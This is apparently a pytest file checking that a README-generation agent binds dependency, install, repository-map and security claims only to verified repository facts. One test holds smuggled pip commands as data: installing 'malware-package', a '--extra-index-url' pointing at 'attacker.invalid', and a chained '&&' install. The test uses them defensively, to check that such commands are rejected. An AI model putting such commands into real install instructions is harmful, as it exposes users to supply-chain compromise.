"""Verify common inherited README details bind only to accepted repository evidence."""

from __future__ import annotations

from readme_agent.facts.schema_v2 import FactRecordV2, FactSourceV2, ProductFactsV2
from readme_agent.golden_set.review_fixtures import REVIEW_ARCHETYPES, build_review_facts
from readme_agent.readme.assessment_claims import assess_material_claims
from readme_agent.readme.source_claim_fact_binding import complete_source_claim_fact_binding


def _facts() -> ProductFactsV2:
    values = {
        "api.public_surface": {"modules": [], "classes": [{"name": "PdfLoadLimits"}]},
        "development.assets": {"tests": {"count": 2}},
        "development.commands": {"entries": [{"command": "python -m ruff check src/"}]},
        "installation.coordinates": [{"ecosystem": "python", "name": "aspose-pdf-foss-for-python"}],
        "installation.optional_extras": {
            "manifest_path": "pyproject.toml",
            "extras": {
                "images": ["Pillow>=10"],
                "text-layout": ["uharfbuzz>=0.37", "python-bidi>=0.6"],
                "woff2": ["Brotli>=1.0"],
            },
        },
        "installation.verified_acquisition": {
            "ecosystem": "python",
            "method": "source_build",
            "outcome": "SOURCE_BUILD_VERIFIED",
            "source_build_receipt": {"truth_eligible": True},
            "truth_eligible": True,
        },
        "python.distribution": {"runtime_dependencies": ["cryptography>=42", "asn1crypto>=1.5"]},
        "repository.ci": {"path": ".github/workflows/ci.yml"},
        "repository.contribution_guidance": {"validation_scripts": [{"path": "scripts/check.sh"}]},
        "repository.security_guidance": {
            "policy": {"path": "SECURITY.md"},
            "resource_limits": {
                "class": "PdfLoadLimits",
                "fields": ["max_input_bytes"],
                "entry_points": ["load_from"],
            },
        },
    }
    locations = {
        "api.public_surface": "repository://src/aspose_pdf/__init__.py",
        "development.assets": "repository://tests/test_document.py",
        "development.commands": "repository://scripts/check.sh",
        "repository.ci": "repository://.github/workflows/ci.yml",
        "repository.contribution_guidance": "repository://scripts/check.sh",
        "repository.security_guidance": "repository://SECURITY.md,src/aspose_pdf/load_limits.py",
    }
    records = [
        FactRecordV2(
            fact_id=f"{field}:test",
            field=field,
            value=value,
            source=FactSourceV2(
                source_type="mechanical_repository",
                location=locations.get(field, "repository://pyproject.toml"),
                source_revision="a" * 40,
            ),
            verification_state="verified",
            authoritative_owner="repository-owner",
            confidence=1.0,
            affected_surfaces=["readme"],
        )
        for field, value in values.items()
    ]
    base = ProductFactsV2.model_validate(build_review_facts(REVIEW_ARCHETYPES[2]))
    added_fields = set(values)
    return base.model_copy(
        update={
            "facts": [
                *[fact for fact in base.facts if fact.field not in added_fields],
                *records,
            ],
            "selected_fact_ids": {
                **base.selected_fact_ids,
                **{record.field: record.fact_id for record in records},
            },
        }
    )


def _binding(source: str, fragment: str, facts: ProductFactsV2 | None = None):
    claim = next(
        claim
        for claim in assess_material_claims(source)
        if fragment
        in source.encode("utf-8")[claim.source_byte_start : claim.source_byte_end].decode("utf-8")
    )
    return complete_source_claim_fact_binding(source, claim, facts or _facts())


def test_dependency_details_bind_to_manifest_facts() -> None:
    source = """# Product

## Requirements

- `cryptography`

Optional extras add Pillow, Brotli WOFF2, and HarfBuzz/bidi text layout.

```bash
python -m pip install '.[images,woff2,text-layout]'
```
"""

    assert _binding(source, "cryptography") is not None
    assert _binding(source, "Pillow") is not None
    assert _binding(source, "pip install") is not None


def test_source_build_does_not_bind_a_registry_target_for_optional_extras() -> None:
    source = """# Product

## Requirements

```bash
python -m pip install 'aspose-pdf-foss-for-python[images,woff2,text-layout]'
```
"""

    assert _binding(source, "pip install") is None


def test_non_python_product_does_not_bind_python_optional_extras() -> None:
    facts = _facts()
    non_python = facts.model_copy(
        update={
            "facts": [
                fact.model_copy(update={"value": {**fact.value, "ecosystem": "java"}})
                if fact.field == "product.identity" and isinstance(fact.value, dict)
                else fact
                for fact in facts.facts
            ]
        }
    )
    source = """# Product

## Requirements

```bash
python -m pip install '.[images]'
```
"""

    assert _binding(source, "pip install", non_python) is None


def test_failed_source_build_does_not_bind_python_optional_extras() -> None:
    facts = _facts()
    failed = facts.model_copy(
        update={
            "facts": [
                fact.model_copy(
                    update={
                        "value": {
                            "ecosystem": "python",
                            "method": "source_build",
                            "outcome": "SOURCE_BUILD_FAILED",
                            "truth_eligible": False,
                        }
                    }
                )
                if fact.field == "installation.verified_acquisition"
                else fact
                for fact in facts.facts
            ]
        }
    )
    source = """# Product

## Requirements

```bash
python -m pip install '.[images]'
```
"""

    assert _binding(source, "pip install", failed) is None


def test_optional_extras_binding_rejects_trailing_shell_content() -> None:
    commands = (
        "python -m pip install '.[images]' malware-package",
        "python -m pip install '.[images]' --extra-index-url https://attacker.invalid/simple",
        "python -m pip install '.[images]' && python -m pip install malware-package",
    )

    for command in commands:
        source = f"# Product\n\n## Requirements\n\n```bash\n{command}\n```\n"
        assert _binding(source, "pip install") is None, command


def test_registry_extras_bind_only_to_the_receipt_selected_coordinate() -> None:
    facts = _facts()
    replacements = {
        "installation.coordinates": [
            {"ecosystem": "python", "name": "verified-package"},
            {"ecosystem": "python", "name": "unverified-sibling"},
        ],
        "installation.verified_acquisition": {
            "ecosystem": "python",
            "method": "pypi",
            "outcome": "REGISTRY_VERIFIED",
            "coordinate": {"name": "verified-package"},
            "registry_receipt": {
                "coordinate": {"name": "verified-package"},
                "found": True,
            },
            "truth_eligible": True,
        },
    }
    registry_facts = facts.model_copy(
        update={
            "facts": [
                fact.model_copy(update={"value": replacements[fact.field]})
                if fact.field in replacements
                else fact
                for fact in facts.facts
            ]
        }
    )
    verified = """# Product

## Requirements

```bash
python -m pip install 'verified-package[images]'
```
"""
    sibling = verified.replace("verified-package", "unverified-sibling")

    assert _binding(verified, "pip install", registry_facts) is not None
    assert _binding(sibling, "pip install", registry_facts) is None


def test_unknown_dependency_remains_unbound() -> None:
    source = "# Product\n\n## Requirements\n\n- `mystery-package`\n"

    assert _binding(source, "mystery-package") is None


def test_repository_map_contribution_and_security_have_canonical_evidence() -> None:
    source = """# Product

## Repository Map

| Path | Description |
| --- | --- |
| `src/aspose_pdf/` | Public package |
| `tests/` | Tests |
| `scripts/` | Validation scripts |
| `.github/workflows/` | CI workflows |

## Contributing

Keep changes focused and add tests for new behavior.

## Security

Use `PdfLoadLimits` when loading untrusted files.

```python
limits = PdfLoadLimits(max_input_bytes=1024)
```
"""

    assert _binding(source, "Public package") is not None
    assert _binding(source, "Keep changes focused") is not None
    assert _binding(source, "max_input_bytes") is not None
